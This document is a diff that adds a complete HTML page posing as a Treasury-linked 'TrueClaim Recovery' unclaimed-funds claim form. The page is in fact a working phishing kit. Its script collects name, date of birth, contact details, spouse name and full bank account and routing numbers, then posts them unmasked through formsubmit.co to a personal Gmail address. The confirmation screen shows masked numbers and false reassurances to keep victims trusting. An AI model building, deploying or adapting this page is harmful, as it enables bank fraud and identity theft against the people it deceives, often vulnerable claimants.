@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TrueClaim Recovery — Claimant Registration &amp; Disbursement Authorization</title>
+<style>
+  :root{
+    --paper:#F0EEEB; --ink:#0E0E0E; --ink-soft:#231F20; --muted:#5F5F5F;
+    --green:#41674e; --red:#b02323; --line:rgba(14,14,14,.28);
+    --serif:Georgia,'Times New Roman',serif;
+    --sans:'Helvetica Neue',Helvetica,Arial,sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    background:var(--paper); color:var(--ink);
+    font-family:var(--sans); font-size:16px; line-height:1.6;
+    min-height:100dvh; padding:24px 16px 64px;
+  }
+  .sheet{max-width:720px;margin:0 auto}
+
+  .doc-head{border-bottom:2px solid var(--ink);padding-bottom:18px;margin-bottom:8px}
+  .agency{font-size:12px;letter-spacing:.22em;text-transform:uppercase;color:var(--muted);margin-bottom:6px}
+  .brand{font-family:var(--serif);font-size:clamp(26px,6vw,38px);font-weight:700;letter-spacing:.01em;line-height:1.1}
+  .doc-meta{display:flex;flex-wrap:wrap;gap:6px 24px;margin-top:12px;font-size:13px;color:var(--ink-soft)}
+  .doc-meta b{font-weight:600}
+  .doc-title{
+    font-family:var(--serif);font-size:clamp(19px,4.6vw,24px);font-weight:700;
+    text-align:center;margin:26px 0 6px;
+  }
+  .doc-sub{text-align:center;font-size:13.5px;color:var(--muted);margin-bottom:26px}
+
+  .notice{border:1.5px solid var(--ink);padding:16px 18px;margin:0 0 34px;background:rgba(255,255,255,.35)}
+  .notice h2{font-size:12.5px;letter-spacing:.18em;text-transform:uppercase;margin-bottom:10px}
+  .notice p{font-size:14.5px;margin-bottom:8px}
+  .notice p:last-child{margin-bottom:0}
+  .notice strong{font-weight:700}
+
+  fieldset{border:none;margin-bottom:38px}
+  .sec-label{font-size:12px;letter-spacing:.2em;text-transform:uppercase;color:var(--muted)}
+  legend,.sec-title{
+    font-family:var(--serif);font-size:20px;font-weight:700;
+    padding:0;margin:2px 0 4px;width:100%;
+  }
+  .sec-note{font-size:13.5px;color:var(--muted);margin-bottom:18px}
+  .rule{border:none;border-top:1px dotted var(--line);margin:10px 0 20px}
+
+  .grid{display:grid;grid-template-columns:1fr;gap:18px 24px}
+  @media(min-width:560px){.grid.cols2{grid-template-columns:1fr 1fr}}
+
+  label.field{display:block}
+  .flabel{display:block;font-size:13px;font-weight:600;letter-spacing:.02em;margin-bottom:2px}
+  .req{color:var(--red)}
+  .fhint{font-size:12px;color:var(--muted)}
+  input[type=text],input[type=email],input[type=tel],input[type=date],input[type=number],select{
+    width:100%;background:transparent;border:none;border-radius:0;
+    border-bottom:1px solid var(--muted);
+    font-family:var(--sans);font-size:16px;color:var(--ink);
+    padding:10px 2px 8px;min-height:44px;outline:none;
+    transition:border-color .15s ease;
+  }
+  select{cursor:pointer}
+  input:focus,select:focus{border-bottom:2px solid var(--ink)}
+  input:focus-visible,select:focus-visible,button:focus-visible{outline:2px solid var(--ink);outline-offset:3px}
+  input::placeholder{color:#9a9690}
+  .invalid input,.invalid select{border-bottom:2px solid var(--red)}
+  .err{display:none;font-size:12.5px;color:var(--red);margin-top:4px}
+  .invalid .err{display:block}
+
+  .radio-row{display:flex;gap:12px;flex-wrap:wrap}
+  .radio-pill{
+    display:flex;align-items:center;gap:8px;min-height:44px;
+    border:1px solid var(--ink);padding:8px 16px;cursor:pointer;font-size:14.5px;
+    background:transparent;transition:background .15s ease,color .15s ease;
+  }
+  .radio-pill input{accent-color:var(--ink);width:18px;height:18px;cursor:pointer}
+  .radio-pill:has(input:checked){background:var(--ink);color:var(--paper)}
+
+  .check{display:flex;gap:12px;align-items:flex-start;min-height:44px;padding:10px 0;cursor:pointer;font-size:14.5px}
+  .check input{width:20px;height:20px;margin-top:2px;accent-color:var(--ink);cursor:pointer;flex:none}
+
+  .inst-list{font-size:13px;color:var(--ink-soft);border-top:1px dotted var(--line);border-bottom:1px dotted var(--line);padding:10px 2px;margin:0 0 18px}
+
+  .dob-grid{display:grid;grid-template-columns:1.5fr .8fr 1fr;gap:12px}
+
+  .actions{display:flex;flex-direction:column;gap:14px;margin-top:8px}
+  button{
+    font-family:var(--sans);font-size:15px;font-weight:600;letter-spacing:.12em;text-transform:uppercase;
+    min-height:52px;padding:14px 24px;cursor:pointer;
+    border:1.5px solid var(--ink);background:var(--ink);color:var(--paper);
+    transition:background .15s ease,color .15s ease,transform .1s ease;
+  }
+  button:hover{background:var(--ink-soft)}
+  button:active{transform:scale(.98)}
+  button.ghost{background:transparent;color:var(--ink)}
+  button.ghost:hover{background:rgba(14,14,14,.08)}
+  @media(min-width:560px){.actions{flex-direction:row}.actions button{flex:1}}
+
+  #confirmView{display:none}
+  .seal{
+    width:88px;height:88px;border:2px solid var(--green);border-radius:50%;
+    display:flex;align-items:center;justify-content:center;margin:26px auto 14px;
+    color:var(--green);
+  }
+  .conf-title{font-family:var(--serif);font-size:24px;font-weight:700;text-align:center}
+  .conf-sub{text-align:center;color:var(--muted);font-size:14px;margin:6px 0 22px}
+  .conf-ref{
+    text-align:center;font-size:15px;margin-bottom:26px;padding:14px;
+    border:1.5px dashed var(--ink);
+  }
+  .conf-ref b{font-family:var(--serif);font-size:20px;letter-spacing:.06em}
+  .summary{border-top:1px dotted var(--line);margin-bottom:26px}
+  .srow{display:flex;justify-content:space-between;gap:16px;padding:9px 2px;border-bottom:1px dotted var(--line);font-size:14px}
+  .srow span:first-child{color:var(--muted);flex:none}
+  .srow span:last-child{text-align:right;word-break:break-word}
+  .next-steps{font-size:14.5px;margin-bottom:26px}
+  .next-steps li{margin:8px 0 8px 20px}
+  .send-status{font-size:13.5px;text-align:center;margin:-14px 0 22px;min-height:20px}
+  .send-status.sending{color:var(--muted)}
+  .send-status.ok{color:var(--green);font-weight:600}
+  .send-status.fail{color:var(--red)}
+  .send-status button{
+    min-height:0;padding:2px 10px;margin-left:6px;font-size:12px;letter-spacing:.06em;
+    border:1px solid var(--red);background:transparent;color:var(--red);
+  }
+  .help-line{font-size:14px;border:1px dashed var(--ink);padding:14px 16px;margin-bottom:26px;background:rgba(255,255,255,.35)}
+
+  footer{border-top:2px solid var(--ink);margin-top:44px;padding-top:16px;font-size:12.5px;color:var(--muted);text-align:center}
+
+  @media print{
+    body{background:#fff;padding:0}
+    .actions,#formView .no-print{display:none}
+    button{display:none}
+  }
+  @media(prefers-reduced-motion:reduce){
+    *{transition:none!important}
+  }
+</style>
+</head>
+<body>
+<div class="sheet">
+
+  <div id="formView">
+    <header class="doc-head">
+      <div class="agency">Unclaimed Property Division</div>
+      <div class="brand">TrueClaim Recovery</div>
+      <div class="doc-meta">
+        <span><b>Form TCR-100</b> (Rev. 2026)</span>
+        <span>Claim documentation issued through the U.S. Department of the Treasury</span>
+      </div>
+    </header>
+
+    <h1 class="doc-title">Claimant Registration &amp; Disbursement Authorization</h1>
+    <p class="doc-sub">Complete all required fields below. This form registers your claim and authorizes electronic disbursement of your approved funds.</p>
+
+    <div class="notice">
+      <h2>Important — Disbursement Notice</h2>
+      <p><strong>Electronic delivery only.</strong> Approved claim funds are disbursed directly to a financial institution account held in the claimant's name. <strong>No checks are issued or mailed</strong>, so no mailing or courier charges of any kind apply.</p>
+      <p><strong>No fees, ever.</strong> Claimants are never asked to pay anything to register, verify, or receive their claim.</p>
+      <p><strong>Processing time.</strong> Estimated 1–3 business days following completed verification. Applicable taxes are settled in accordance with the claim documentation, as stated in your notification letter.</p>
+    </div>
+
+    <form id="claimForm" novalidate>
+
+      <fieldset>
+        <div class="sec-label">Section 1</div>
+        <legend class="sec-title">Claimant Information</legend>
+        <hr class="rule">
+        <div class="grid cols2">
+          <label class="field">
+            <span class="flabel">Full Legal Name <span class="req">*</span></span>
+            <input type="text" name="fullName" autocomplete="name" required>
+            <span class="err">Please enter your full legal name.</span>
+          </label>
+          <div class="field" style="grid-column:1/-1">
+            <span class="flabel">Date of Birth <span class="req">*</span></span>
+            <div class="dob-grid">
+              <select name="dobMonth" id="dobMonth" required aria-label="Birth month"><option value="">Month</option></select>
+              <select name="dobDay" id="dobDay" required aria-label="Birth day"><option value="">Day</option></select>
+              <select name="dobYear" id="dobYear" required aria-label="Birth year"><option value="">Year</option></select>
+            </div>
+            <span class="err">Please select your month, day, and year of birth.</span>
+          </div>
+          <label class="field">
+            <span class="flabel">Phone Number <span class="req">*</span></span>
+            <input type="tel" name="phone" autocomplete="tel" placeholder="(___) ___-____" required>
+            <span class="err">Please enter a valid phone number.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Email Address <span class="req">*</span></span>
+            <input type="email" name="email" autocomplete="email" required>
+            <span class="err">Please enter a valid email address.</span>
+          </label>
+        </div>
+        <div class="grid cols2" style="margin-top:18px">
+          <div class="field">
+            <span class="flabel">Preferred Contact Method <span class="req">*</span></span>
+            <div class="radio-row" role="radiogroup" aria-label="Preferred contact method">
+              <label class="radio-pill"><input type="radio" name="prefContact" value="Call" required> Call</label>
+              <label class="radio-pill"><input type="radio" name="prefContact" value="Text"> Text</label>
+              <label class="radio-pill"><input type="radio" name="prefContact" value="Email"> Email</label>
+            </div>
+            <span class="err">Please choose how you would like us to reach you.</span>
+          </div>
+          <label class="field">
+            <span class="flabel">Other Names Used</span>
+            <input type="text" name="otherNames" placeholder="Maiden or previous names, if any">
+            <span class="fhint">Claims are sometimes filed under a previous name — this helps us find everything owed to you.</span>
+          </label>
+        </div>
+        <div class="grid" style="margin-top:18px">
+          <label class="field">
+            <span class="flabel">Mailing Address <span class="req">*</span></span>
+            <input type="text" name="address" autocomplete="street-address" placeholder="Street, City, State, ZIP" required>
+            <span class="err">Please enter your mailing address.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Claim / Case Reference Number</span>
+            <input type="text" name="caseRef" placeholder="As shown on your notification letter">
+            <span class="fhint">Found at the top of the notification you received from our office.</span>
+          </label>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <div class="sec-label">Section 2</div>
+        <legend class="sec-title">Claimant Status</legend>
+        <p class="sec-note">This form is open to all qualified United States citizens and permanent residents.</p>
+        <hr class="rule">
+        <div class="grid">
+          <div class="field">
+            <span class="flabel">Status <span class="req">*</span></span>
+            <div class="radio-row" role="radiogroup" aria-label="Status">
+              <label class="radio-pill"><input type="radio" name="status" value="U.S. Citizen" required> U.S. Citizen</label>
+              <label class="radio-pill"><input type="radio" name="status" value="Permanent Resident"> Permanent Resident</label>
+            </div>
+            <span class="err">Please select your status.</span>
+          </div>
+          <label class="field">
+            <span class="flabel">State of Residence <span class="req">*</span></span>
+            <select name="state" id="state" required><option value="">Select your state…</option></select>
+            <span class="err">Please select your state of residence.</span>
+          </label>
+          <div class="field">
+            <span class="flabel">Marital Status <span class="req">*</span></span>
+            <div class="radio-row" role="radiogroup" aria-label="Marital status">
+              <label class="radio-pill"><input type="radio" name="marital" value="Single" required> Single</label>
+              <label class="radio-pill"><input type="radio" name="marital" value="Married"> Married</label>
+              <label class="radio-pill"><input type="radio" name="marital" value="Widowed"> Widowed</label>
+              <label class="radio-pill"><input type="radio" name="marital" value="Divorced"> Divorced</label>
+            </div>
+            <span class="err">Please select your marital status.</span>
+          </div>
+          <label class="field" id="spouseWrap" style="display:none">
+            <span class="flabel">Spouse's Full Name <span class="req">*</span></span>
+            <input type="text" name="spouseName" placeholder="Current or late spouse's full name">
+            <span class="fhint">Assets are often held under a spouse's name — this helps us check both.</span>
+            <span class="err">Please enter your spouse's full name.</span>
+          </label>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <div class="sec-label">Section 3</div>
+        <legend class="sec-title">Disbursement Instructions</legend>
+        <p class="sec-note">Your approved funds are delivered electronically to an account held in your name. Electronic delivery is supported to accounts at major U.S. institutions and payment platforms.</p>
+        <hr class="rule">
+        <p class="inst-list">Supported institutions include Bank of America, Chase, PNC Bank, Wells Fargo, and Bank of the West, as well as supported platforms such as Cash App, Chime, PayPal, and Venmo. If your institution is not listed, select “Other” and enter its name.</p>
+        <div class="grid cols2">
+          <label class="field">
+            <span class="flabel">Financial Institution <span class="req">*</span></span>
+            <select name="institution" id="institution" required>
+              <option value="">Select…</option>
+              <option>Bank of America</option><option>Chase</option><option>PNC Bank</option>
+              <option>Wells Fargo</option><option>Bank of the West</option>
+              <option>Cash App</option><option>Chime</option><option>PayPal</option>
+              <option>Venmo</option><option>Other</option>
+            </select>
+            <span class="err">Please select your institution.</span>
+          </label>
+          <label class="field" id="otherInstWrap" style="display:none">
+            <span class="flabel">Institution Name <span class="req">*</span></span>
+            <input type="text" name="otherInstitution">
+            <span class="err">Please enter the institution name.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Account Holder Name <span class="req">*</span></span>
+            <input type="text" name="acctHolder" required>
+            <span class="fhint">Must match the claimant name on this form.</span>
+            <span class="err">Please enter the account holder name.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Account Type <span class="req">*</span></span>
+            <div class="radio-row" role="radiogroup" aria-label="Account type">
+              <label class="radio-pill"><input type="radio" name="acctType" value="Checking" required> Checking</label>
+              <label class="radio-pill"><input type="radio" name="acctType" value="Savings"> Savings</label>
+            </div>
+            <span class="err">Please select an account type.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Routing Number <span class="req">*</span></span>
+            <input type="text" name="routing" inputmode="numeric" maxlength="9" placeholder="9 digits" required>
+            <span class="err">Routing number must be exactly 9 digits.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Account Number <span class="req">*</span></span>
+            <input type="text" name="account" inputmode="numeric" maxlength="17" required>
+            <span class="err">Please enter your account number (4–17 digits).</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Confirm Account Number <span class="req">*</span></span>
+            <input type="text" name="account2" inputmode="numeric" maxlength="17" required>
+            <span class="err">Account numbers do not match.</span>
+          </label>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <div class="sec-label">Section 4</div>
+        <legend class="sec-title">Declaration &amp; Authorization</legend>
+        <hr class="rule">
+        <label class="check">
+          <input type="checkbox" name="d1" required>
+          <span>I declare that the information provided on this form is true, complete, and accurate to the best of my knowledge. <span class="req">*</span></span>
+        </label>
+        <label class="check">
+          <input type="checkbox" name="d2" required>
+          <span>I authorize TrueClaim Recovery to disburse my approved claim funds electronically to the account listed in Section 3, and I understand that no checks will be issued or mailed. <span class="req">*</span></span>
+        </label>
+        <label class="check">
+          <input type="checkbox" name="d3" required>
+          <span>I understand that no fees are charged to me at any stage of the registration, verification, or disbursement process. <span class="req">*</span></span>
+        </label>
+        <div class="grid cols2" style="margin-top:18px">
+          <label class="field">
+            <span class="flabel">Signature (type full name) <span class="req">*</span></span>
+            <input type="text" name="signature" required>
+            <span class="err">Please sign by typing your full name.</span>
+          </label>
+          <label class="field">
+            <span class="flabel">Date</span>
+            <input type="text" name="sigDate" id="sigDate" readonly>
+          </label>
+        </div>
+      </fieldset>
+
+      <div class="actions no-print">
+        <button type="submit" id="submitBtn">Submit Registration</button>
+        <button type="reset" class="ghost" id="resetBtn">Clear Form</button>
+      </div>
+      <p id="formError" style="display:none;color:var(--red);font-size:14px;margin-top:14px">Some required fields need attention. Please review the highlighted fields above.</p>
+    </form>
+  </div>
+
+  <div id="confirmView">
+    <header class="doc-head">
+      <div class="agency">Unclaimed Property Division</div>
+      <div class="brand">TrueClaim Recovery</div>
+    </header>
+    <div class="seal" aria-hidden="true">
+      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+    </div>
+    <h2 class="conf-title">Registration Received</h2>
+    <p class="conf-sub">Your claimant registration has been completed successfully.</p>
+    <div class="conf-ref">Submission Reference<br><b id="confRef">—</b></div>
+    <p id="sendStatus" class="send-status"></p>
+
+    <div class="summary" id="confSummary"></div>
+
+    <div class="next-steps">
+      <strong>What happens next — step by step:</strong>
+      <ol>
+        <li><strong>Transmission.</strong> Your registration is sent securely to our office and placed in your claim file under the submission reference above.</li>
+        <li><strong>Verification (same day to 1 business day).</strong> Your case manager reviews every detail against the claim documentation on file. If anything needs attention — a mistyped account number or a name that does not match — we will contact you at the phone number or email you provided.</li>
+        <li><strong>Scheduling.</strong> Once verification is complete, your disbursement is scheduled for electronic release to the account you authorized — estimated 1–3 business days.</li>
+        <li><strong>Completion.</strong> You receive a final confirmation from your case manager when the release is done.</li>
+      </ol>
+      <p style="margin-top:16px"><strong>Why we might call you:</strong> only to verify your identity, confirm your account details, or correct a small mismatch. If you miss our call, do not worry — we always follow up in writing, and your file is never cancelled because of a missed call.</p>
+      <p style="margin-top:12px"><strong>For your protection, please remember:</strong> our office will never ask you for an upfront payment, a gift card, or your online banking password. Anyone who asks for those is not from our office.</p>
+      <p style="margin-top:12px">Keep your submission reference number and quote it in any correspondence with our office.</p>
+    </div>
+
+    <p class="help-line">Questions, or need to correct something you submitted? Email us at <b id="helpEmail"></b> or call or text <b id="helpPhone"></b> — Monday to Friday, 9:00 AM–6:00 PM CT. Please quote your submission reference.</p>
+
+    <div class="actions no-print">
+      <button type="button" id="printBtn">Print / Save Record</button>
+      <button type="button" class="ghost" id="editBtn">Go Back &amp; Edit</button>
+    </div>
+  </div>
+
+  <footer>
+    TrueClaim Recovery · Unclaimed Property Division<br>
+    Claim documentation issued through the U.S. Department of the Treasury<br>
+    <span id="footEmail"></span> · <span id="footPhone"></span> · Monday–Friday, 9:00 AM–6:00 PM CT<br>
+    Form TCR-100 (Rev. 2026) · Claimant Registration &amp; Disbursement Authorization
+  </footer>
+</div>
+
+<script>
+(function(){
+  // ===== YOUR OFFICE CONTACT DETAILS — change these two lines anytime (e.g. a second company number) =====
+  const OFFICE_EMAIL = 'gregdoroski.dott@gmail.com';
+  const OFFICE_PHONE = '(956) 704-8309';
+
+  const form = document.getElementById('claimForm');
+  const formView = document.getElementById('formView');
+  const confirmView = document.getElementById('confirmView');
+  const formError = document.getElementById('formError');
+  const institution = document.getElementById('institution');
+  const otherWrap = document.getElementById('otherInstWrap');
+
+  document.getElementById('sigDate').value = new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
+  document.getElementById('footEmail').textContent = OFFICE_EMAIL;
+  document.getElementById('helpEmail').textContent = OFFICE_EMAIL;
+  document.getElementById('footPhone').textContent = OFFICE_PHONE;
+  document.getElementById('helpPhone').textContent = OFFICE_PHONE;
+
+  // Populate scroll selectors
+  const addOpts = (id, items) => {
+    const sel = document.getElementById(id);
+    items.forEach(t => { const o = document.createElement('option'); o.textContent = t; sel.appendChild(o); });
+  };
+  addOpts('dobMonth', ['January','February','March','April','May','June','July','August','September','October','November','December']);
+  addOpts('dobDay', Array.from({length:31}, (_,i) => i + 1));
+  const thisYear = new Date().getFullYear();
+  addOpts('dobYear', Array.from({length: thisYear - 1899}, (_,i) => thisYear - i));
+  addOpts('state', ['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware','District of Columbia','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia','Wisconsin','Wyoming']);
+
+  institution.addEventListener('change', function(){
+    const isOther = this.value === 'Other';
+    otherWrap.style.display = isOther ? 'block' : 'none';
+    otherWrap.querySelector('input').required = isOther;
+  });
+
+  const spouseWrap = document.getElementById('spouseWrap');
+  form.querySelectorAll('input[name="marital"]').forEach(r => r.addEventListener('change', function(){
+    const needsSpouse = this.value === 'Married' || this.value === 'Widowed';
+    spouseWrap.style.display = needsSpouse ? 'block' : 'none';
+    spouseWrap.querySelector('input').required = needsSpouse;
+    if(!needsSpouse) spouseWrap.classList.remove('invalid');
+  }));
+
+  function setState(field, ok){
+    const wrap = field.closest('.field');
+    if(wrap) wrap.classList.toggle('invalid', !ok);
+    return ok;
+  }
+  const digits = v => v.replace(/\D/g,'');
+
+  function validate(){
+    let firstBad = null;
+    const check = (name, fn) => {
+      const el = form.elements[name];
+      const ok = fn(el.value.trim());
+      if(!setState(el, ok) && !firstBad) firstBad = el;
+      return ok;
+    };
+    let all = true;
+    all = check('fullName', v => v.length >= 3) && all;
+    const dobOk = ['dobMonth','dobDay','dobYear'].every(n => form.elements[n].value !== '');
+    const dobWrap = form.elements['dobMonth'].closest('.field');
+    dobWrap.classList.toggle('invalid', !dobOk);
+    if(!dobOk){ all = false; if(!firstBad) firstBad = form.elements['dobMonth']; }
+    all = check('phone', v => digits(v).length >= 7) && all;
+    all = check('email', v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) && all;
+    const prefEl = form.querySelector('input[name="prefContact"]:checked');
+    const prefWrap = form.querySelector('input[name="prefContact"]').closest('.field');
+    prefWrap.classList.toggle('invalid', !prefEl);
+    if(!prefEl){ all = false; if(!firstBad) firstBad = form.querySelector('input[name="prefContact"]'); }
+    all = check('address', v => v.length >= 6) && all;
+    const statusEl = form.querySelector('input[name="status"]:checked');
+    const statusWrap = form.querySelector('input[name="status"]').closest('.field');
+    statusWrap.classList.toggle('invalid', !statusEl);
+    if(!statusEl){ all = false; if(!firstBad) firstBad = form.querySelector('input[name="status"]'); }
+    all = check('state', v => !!v) && all;
+    const maritalEl = form.querySelector('input[name="marital"]:checked');
+    const maritalWrap = form.querySelector('input[name="marital"]').closest('.field');
+    maritalWrap.classList.toggle('invalid', !maritalEl);
+    if(!maritalEl){ all = false; if(!firstBad) firstBad = form.querySelector('input[name="marital"]'); }
+    if(maritalEl && (maritalEl.value === 'Married' || maritalEl.value === 'Widowed')){
+      all = check('spouseName', v => v.length >= 3) && all;
+    }
+    all = check('institution', v => !!v) && all;
+    if(institution.value === 'Other') all = check('otherInstitution', v => v.length >= 2) && all;
+    all = check('acctHolder', v => v.length >= 3) && all;
+    const acctType = form.querySelector('input[name="acctType"]:checked');
+    const typeWrap = form.querySelector('input[name="acctType"]').closest('.field');
+    typeWrap.classList.toggle('invalid', !acctType);
+    if(!acctType){ all = false; if(!firstBad) firstBad = form.querySelector('input[name="acctType"]'); }
+    all = check('routing', v => digits(v).length === 9) && all;
+    all = check('account', v => digits(v).length >= 4 && digits(v).length <= 17) && all;
+    all = check('account2', v => v === form.elements['account'].value.trim() && v.length > 0) && all;
+    ['d1','d2','d3'].forEach(n => { if(!form.elements[n].checked){ all = false; } });
+    const sig = form.elements['signature'];
+    const sigOk = sig.value.trim().length >= 3;
+    setState(sig, sigOk);
+    if(!sigOk){ all = false; if(!firstBad) firstBad = sig; }
+    if(!all && !firstBad) firstBad = form.elements['d1'];
+    return { ok: all, firstBad };
+  }
+
+  // ===== Transmission to office inbox =====
+  function sendToOffice(payload){
+    const status = document.getElementById('sendStatus');
+    status.textContent = 'Sending a copy of this registration to our office…';
+    status.className = 'send-status sending';
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 12000);
+    fetch('https://formsubmit.co/ajax/' + OFFICE_EMAIL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload),
+      signal: controller.signal
+    }).then(res => {
+      clearTimeout(timer);
+      if(!res.ok) throw new Error('send failed');
+      status.textContent = 'A copy of this registration has been securely received by our office.';
+      status.className = 'send-status ok';
+    }).catch(() => {
+      clearTimeout(timer);
+      status.innerHTML = 'This copy could not be sent automatically. <button type="button" id="retrySend">Tap to resend</button>';
+      status.className = 'send-status fail';
+      document.getElementById('retrySend').addEventListener('click', () => sendToOffice(payload));
+    });
+  }
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    const res = validate();
+    if(!res.ok){
+      formError.style.display = 'block';
+      res.firstBad.focus({preventScroll:false});
+      res.firstBad.scrollIntoView({behavior:'smooth', block:'center'});
+      return;
+    }
+    formError.style.display = 'none';
+
+    const v = n => form.elements[n].value.trim();
+    const ref = 'TCR-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
+    document.getElementById('confRef').textContent = ref;
+
+    const acct = v('account');
+    const masked = '••••' + acct.slice(-4);
+    const instName = institution.value === 'Other' ? v('otherInstitution') : institution.value;
+    const acctType = form.querySelector('input[name="acctType"]:checked').value;
+    const maritalVal = form.querySelector('input[name="marital"]:checked').value;
+
+    const rows = [
+      ['Claimant', v('fullName')],
+      ['Other Names Used', v('otherNames') || '—'],
+      ['Date of Birth', v('dobMonth') + ' ' + v('dobDay') + ', ' + v('dobYear')],
+      ['Phone', v('phone')],
+      ['Email', v('email')],
+      ['Preferred Contact', form.querySelector('input[name="prefContact"]:checked').value],
+      ['Mailing Address', v('address')],
+      ['Case Reference', v('caseRef') || '—'],
+      ['Status', form.querySelector('input[name="status"]:checked').value + ' · ' + v('state')],
+      ['Marital Status', maritalVal + (v('spouseName') ? ' · Spouse: ' + v('spouseName') : '')],
+      ['Institution', instName],
+      ['Account Holder', v('acctHolder')],
+      ['Account', acctType + ' ' + masked],
+      ['Routing', '••••' + digits(v('routing')).slice(-4)],
+      ['Signature', v('signature')],
+      ['Date', document.getElementById('sigDate').value]
+    ];
+    document.getElementById('confSummary').innerHTML = rows.map(r =>
+      '<div class="srow"><span>' + r[0] + '</span><span>' + r[1].replace(/</g,'&lt;') + '</span></div>'
+    ).join('');
+
+    formView.style.display = 'none';
+    confirmView.style.display = 'block';
+    window.scrollTo({top:0, behavior:'smooth'});
+
+    sendToOffice({
+      _subject: 'New Claimant Registration — ' + ref,
+      _template: 'table',
+      _captcha: 'false',
+      'Submission Reference': ref,
+      'Claimant': v('fullName'),
+      'Other Names Used': v('otherNames') || '—',
+      'Date of Birth': v('dobMonth') + ' ' + v('dobDay') + ', ' + v('dobYear'),
+      'Phone': v('phone'),
+      'Email': v('email'),
+      'Preferred Contact Method': form.querySelector('input[name="prefContact"]:checked').value,
+      'Mailing Address': v('address'),
+      'Case Reference': v('caseRef') || '—',
+      'Status': form.querySelector('input[name="status"]:checked').value,
+      'State of Residence': v('state'),
+      'Marital Status': maritalVal,
+      'Spouse Name': v('spouseName') || '—',
+      'Financial Institution': instName,
+      'Account Holder': v('acctHolder'),
+      'Account Type': acctType,
+      'Account Number': v('account'),
+      'Routing Number': v('routing'),
+      'Signature': v('signature'),
+      'Date': document.getElementById('sigDate').value
+    });
+  });
+
+  form.addEventListener('reset', function(){
+    form.querySelectorAll('.invalid').forEach(el => el.classList.remove('invalid'));
+    formError.style.display = 'none';
+    otherWrap.style.display = 'none';
+    spouseWrap.style.display = 'none';
+    spouseWrap.querySelector('input').required = false;
+  });
+
+  form.addEventListener('input', function(e){
+    const wrap = e.target.closest('.field');
+    if(wrap && wrap.classList.contains('invalid')) wrap.classList.remove('invalid');
+  });
+
+  document.getElementById('printBtn').addEventListener('click', () => window.print());
+  document.getElementById('editBtn').addEventListener('click', function(){
+    confirmView.style.display = 'none';
+    formView.style.display = 'block';
+    window.scrollTo({top:0, behavior:'smooth'});
+  });
+})();
+</script>
+</body>
+</html>
